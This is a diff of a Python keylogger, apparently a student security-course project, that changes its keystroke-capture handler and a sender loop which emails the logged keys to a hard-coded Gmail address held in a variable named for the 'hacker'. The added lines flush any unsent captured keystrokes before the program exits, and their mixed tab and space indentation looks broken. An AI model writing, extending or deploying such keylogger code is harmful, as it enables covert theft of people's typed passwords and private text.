@@ -6,6 +6,7 @@ import subprocess
 from sys import argv
 import threading
 import Queue
+
 destEmail = 'keylogsenderUIUC460@gmail.com'
 dataBufferSize = 500
 hackeremail = "keylogsenderUIUC460"
@@ -102,6 +103,7 @@ def on_release(key, release=True):
 	global data, end_program
 	if(key == exit_key): #exit
 		end_program = True
+		
 		return False
 	try:
 		if(str(key) in holdDowns):
@@ -137,6 +139,8 @@ def run_sender():
 			continue
 		send_data(msg)
 
+        if(len(msg) > 0):
+                send_data(msg) #send any unsent messages before closing
 	if(local):
 		f.close()
 	else:
